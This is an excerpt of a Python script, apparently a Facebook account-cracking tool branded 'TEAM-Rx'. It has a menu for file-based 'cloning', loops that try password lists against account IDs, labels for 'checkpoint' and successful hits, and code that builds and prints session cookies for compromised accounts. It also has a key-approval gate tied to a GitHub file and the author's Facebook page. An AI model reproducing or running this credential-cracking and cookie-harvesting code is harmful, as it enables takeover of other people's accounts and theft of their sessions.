...
try:
	...
	print('[[\x1b[1;92m+\x1b[1;97m] [\x1b[1;96mRx')
...
def login():
	print(logo)
	RABBI('\033[1;96m[1] FILE CLONE\n\x1b[1;92m')
	RABBI('\033[0;97m===============================================')
	Rx= input('\x1b[1;92m[+] CHOOSE: ');time.sleep(0.01)
	if Rx in ['m']:
		public()
	elif Rx in ['1']:
		crack_file()
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				#Rx-
				print(f'\r\033[0;94m[{time.strftime("%H:%M")}•Rx-Cp] {idf} • {pw}')  
				...
				#Rx-
				print(f'\r\033[0;92m[{time.strftime("%H:%M")}•Rx-Ok💝] {idf} • {pw}\n\033[0;93m[🍪]= COOKIES • \033[1;96m{kuki} ')
				print('\033[1;31m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬')
				Elite(idf,pw)
				os.system('espeak -a 300 " Rx,  Ok,  id"')				
...
██   ██ ███████ ██   ████    ██    ██   ██ ██ 
                                                                     TEAM-Rx                              
\033[1;37m==============================================
\033[92;1m<>  \033[1;37mOwner         \033[1;32m :  \033[1;91m Rx
\033[92;1m<>  \033[1;37mFacebook      \033[1;32m :\033[1;97m Suyatul Islam
\033[92;1m<>  \033[1;37mGithub        \033[1;32m : \033[1;97m  
\033[92;1m<>  \033[1;37mADMIN         \033[1;32m :   \033[1;97m\033[92;1m•Rx•  {version}{G}⋆{GGG}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{G}⋆""")
def linex():
        print(f'{G}⋆{GGG}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{G}⋆')
def clear():
	os.system('clear')
...
def menu():
  ...
  try:
    httpCaht = requests.get('https://github.com/Rabbi5657/Rx1approval/blob/main/Approval.txt').text    
    if id in httpCaht:
      ...
      tks = ('Hello%20Sir%20!%20Please%20Approve%20My%20Key%20The%20Key%20Is%20:%20'+id);os.system('am start https://www.facebook.com/suyatulislamrabbi?mibextid=ZbWKwL'+tks),approval()
      time.sleep(9)
      approval()
  except:
    sys.exit()
    ...
    def methodA(self, sid, name, psw):
        try:
            ...
            for pw in psw:
                ...
                if 'session_key' in q:
                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);Rx69b = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={Rx69b};{ckkk}"
